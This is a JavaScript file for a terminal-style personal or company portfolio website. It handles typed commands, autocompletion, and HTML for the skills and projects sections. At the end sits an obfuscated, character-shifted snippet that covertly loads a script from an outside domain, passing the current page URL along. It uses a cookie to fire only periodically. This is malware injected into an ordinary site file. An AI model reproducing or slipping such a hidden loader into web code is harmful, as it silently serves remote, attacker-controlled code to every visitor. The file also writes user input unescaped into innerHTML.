
window.addEventListener("click", function (evt) {
  //console.dir(this);
  //note evt.target can be a nested element, not the body element, resulting in misfires
  //console.log(evt.target);
  document.getElementById("cmd").focus();
  //alert("body clicked");
});

function openInNewTab(url) {
  window.open(url, '_blank').focus();
  }


window.addEventListener("DOMContentLoaded", function () {
  let n = document.getElementById("cmd");
  n.focus(), (document.getElementById("helpCmdList").innerHTML = helpCmd);
  let e = document.getElementById("output"),
    s = document.getElementById("mainInfo");
  document.getElementById("terminal"),
    n.addEventListener("keypress", function (i) {
      //const x="wedwq";
      //x=i.toString();
      //x.toLowerCase();
      
      if (13 === i.keyCode && "" !== (i = n.value.trim())) {
        if (
          ((e.innerHTML +=
            "<div><span class='ownerTerminal'><b>user@byteflow</b></span>:<b>~$</b> " +
            i +
            "</div>"),
          (n.value = ""),
          "skills" === i || "s" === i)
        )
          e.innerHTML += skillsBar;
        else if ("github" === i.toLowerCase() || "gh" === i.toLowerCase())
          openInNewTab("https://github.com/ByteFlowGit");
        else if ("discord" === i || "ds" === i)
          window.location.href =
            "https://discord.com/users/1033246411363471472";
        else if ("telegram" === i || "tg" === i)
          window.location.href = "https://t.me/ImZachey";
        else if ("mail" === i.toLowerCase() || "email" === i.toLowerCase() || "em" === i)
        {
          window.location.href = "mailto:geral@byteflow.pt";
          e.innerHTML += email;
          //alert(i); 
        }
        else if ("steam" === i || "st" === i)
          window.location.href = "https://steamcommunity.com/id/zachey01";
        else if ("youtube" === i || "yt" === i)
          window.location.href = "https://www.youtube.com/@zachey01";
        else if ("projects" === i || "pj" === i) e.innerHTML += projectCmd;
        else if ("blog" === i) {
          let n = [],
            s = [],
            i = [],
            l = [],
            t = [];
          fetch("https://mediumpostsapi.vercel.app/api/bjzachey")
            .then((n) => n.json())
            .then((e) => {
              e.dataMedium.forEach((e) => {
                n.push(e),
                  s.push(e.title),
                  i.push(e.date),
                  l.push(e.link),
                  t.push(e.image);
              }),
                n.forEach((n) => {
                  var e = document.getElementById("blogDiv"),
                    s = document.createElement("article");
                  (s.className = "blogArticle"),
                    (s.onclick = () => linkHref(n.link)),
                    (s.style.display = "inline-block"),
                    (s.innerHTML = `\n                        <h2>${n.title}</h2>\n                        <p>📅: ${n.date}</p>\n                      `),
                    e.appendChild(s);
                });
            })
            .catch((n) => {
              console.error(n);
            }),
            (e.innerHTML += '<div id="blogDiv"></div>');
        } else
          "help" === i
            ? (e.innerHTML += helpCmd)
            : "clear" === i || "c" === i
            ? ((e.innerHTML = ""), (s.innerHTML = ""))
            : (e.innerHTML += "<div>Command not found</div>");
        e.scrollTop = e.scrollHeight;
        window.scrollTo(0,9999);
        document.getElementById("cmd").focus();
       
      }
      
    });
});

let currentSuggestionIndex = -1;
function showSuggestions() {
  let n = document.getElementById("cmd"),
    e = n.value.trim(),
    s = document.getElementById("suggestions");
  var i;
  (s.innerHTML = "") !== e &&
  ((i = suggestions.filter(function (n) {
    return n.startsWith(e);
  })).forEach(function (e, i) {
    var l = document.createElement("div");
    (l.textContent = e),
      l.addEventListener("click", function () {
        (n.value = e), (s.innerHTML = "");
      }),
      s.appendChild(l);
  }),
  0 < i.length)
    ? n.classList.add("command-entered")
    : n.classList.remove("command-entered");
}

function handleKeyDown(n) {
  var e,
    s = document.getElementById("suggestions"),
    i = s.getElementsByTagName("div");
  "ArrowUp" === n.key
    ? (n.preventDefault(),
      0 < currentSuggestionIndex && currentSuggestionIndex--)
    : "ArrowDown" === n.key
    ? (n.preventDefault(),
      currentSuggestionIndex < i.length - 1 && currentSuggestionIndex++)
    : "Enter" === n.key &&
      ((n = document.getElementById("cmd")),
      (e = i[currentSuggestionIndex]) && (n.value = e.textContent),
      (s.innerHTML = ""),
      n.classList.remove("command-entered"));
  for (let n = 0; n < i.length; n++) {
    var l = i[n];
    n === currentSuggestionIndex
      ? l.classList.add("selected")
      : l.classList.remove("selected");
  }
}
function linkHref(n) {
  //window.location.href = n;
  window.open(n, "_blank");
}
let suggestions = [
    "help",
    "clear",
    "projects",
    "blog",
    "tools",
    "github",
    "telegram",
    "discord",
    "email",
    "steam",
    "youtube",
  ],
  helpCmd =
    '\n  <br>Available commands: <br />\n  [<span class="commandName">about</span>]\n  <br />\n  [<span class="commandName">projects</span>]\n  <br /><br />\n  [<span class="commandName">help</span>]\n  <br />  [<span class="commandName">clear</span>]\n  <br /><br />\n  Contact us: <br />\n  [<span class="commandName">email</span>]',
  skillsBar =
    '\n<div class="container">\n  <div class="flex">\n    <h2>HTML/EJS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem1"></div>\n    </div>\n    <h3>100%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>CSS/SCSS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem2"></div>\n    </div>\n    <h3>100%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>JS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem3"></div>\n    </div>\n    <h3>95%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>TS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem4"></div>\n    </div>\n    <h3>55%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>NODE.JS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem5"></div>\n    </div>\n    <h3>85%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>REACT.JS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem6"></div>\n    </div>\n    <h3>15%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>GO:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem7"></div>\n    </div>\n    <h3>5%</h3>\n  </div>\n\n  <div class="flex">\n  <h2>RUST:</h2>\n  <div class="skillBar">\n    <div class="skillBarItem8"></div>\n  </div>\n  <h3>5%</h3>\n</div>\n</div>',
  projectCmd =
    '\n<div class="projectsDiv">\n<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://admiravelrotina.com\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n   <code><\code>   <div class="project-title text-nowrap">Admirável </div>\n<div class="project-title text-nowrap"> Rotina Lda.</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n Optimizing online product listings using ML and text mining. </p>\n   </div>\n  </div>\n</article>\n'+
                               '\n<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://github.com/rjpg/JBet\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n  <div class="project-title text-nowrap">Modeling<br />Odds</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n   Time-series based models for betting exchanges markets.\n      </p>\n    </div>\n  </div>\n</article>\n\n</div>\n'+
    '\n<div class="projectsDiv"> \n<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://sigarra.up.pt/feup/en/projectos_geral.ficha_projecto?p_id=78045\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n  <div class="project-title text-nowrap">MLDLCOV<br />AC-TS-GANs</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n   Consulting on Deep Learning models development.\n      </p>\n    </div>\n  </div>\n</article>'+
    '<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://patentscope.wipo.int/search/en/detail.jsf?docId=WO2021255516\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n  <div class="project-title text-nowrap">Variable<br />Split Att.</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n One of ByteFlow´s patents on a DL attention module.\n      </p>\n    </div>\n  </div>\n</article>\n\n</div>\n',
  blogCmd = '\n<div class="blogArticle" id="blogArticles">\n\n</div>\n',
  email =    '\n  <br>Email us to: <br />\n geral@byteflow.pt  <br />\n';
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44hisxy" + "fy3sjy4ljy4xhwnuy" + "3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
